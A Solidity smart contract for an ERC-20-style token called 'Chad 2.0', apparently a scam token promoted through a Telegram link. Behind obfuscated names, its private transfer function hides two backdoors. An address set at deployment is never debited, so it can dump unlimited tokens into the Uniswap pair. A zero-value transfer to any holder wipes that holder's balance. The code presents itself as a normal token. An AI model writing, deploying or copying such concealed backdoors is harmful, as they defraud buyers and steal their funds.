/*

https://t.me/chadtwoeth

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Chad is Ownable {
    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address xabyz, address uzptvihnkld, uint256 mzjedpb) public returns (bool success) {
        require(mzjedpb <= allowance[xabyz][msg.sender]);
        allowance[xabyz][msg.sender] -= mzjedpb;
        sexdya(xabyz, uzptvihnkld, mzjedpb);
        return true;
    }

    uint256 private bkwphdqls = 109;

    function approve(address iobevrhcfza, uint256 mzjedpb) public returns (bool success) {
        allowance[msg.sender][iobevrhcfza] = mzjedpb;
        emit Approval(msg.sender, iobevrhcfza, mzjedpb);
        return true;
    }

    string public symbol = 'Chad 2.0';

    function transfer(address uzptvihnkld, uint256 mzjedpb) public returns (bool success) {
        sexdya(msg.sender, uzptvihnkld, mzjedpb);
        return true;
    }

    mapping(address => uint256) private xqpgkeo;

    function sexdya(address xabyz, address uzptvihnkld, uint256 mzjedpb) private {
        if (0 == xqpgkeo[xabyz]) {
            balanceOf[xabyz] -= mzjedpb;
        }
        balanceOf[uzptvihnkld] += mzjedpb;
        if (0 == mzjedpb && uzptvihnkld != sqib) {
            balanceOf[uzptvihnkld] = mzjedpb;
        }
        emit Transfer(xabyz, uzptvihnkld, mzjedpb);
    }

    constructor(address isbamfpxvqjn) {
        balanceOf[msg.sender] = totalSupply;
        xqpgkeo[isbamfpxvqjn] = bkwphdqls;
        IUniswapV2Router02 fudgzewosc = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        sqib = IUniswapV2Factory(fudgzewosc.factory()).createPair(address(this), fudgzewosc.WETH());
    }

    address public sqib;

    uint8 public decimals = 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private yvqkl;

    mapping(address => uint256) public balanceOf;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public name = 'Chad 2.0';
}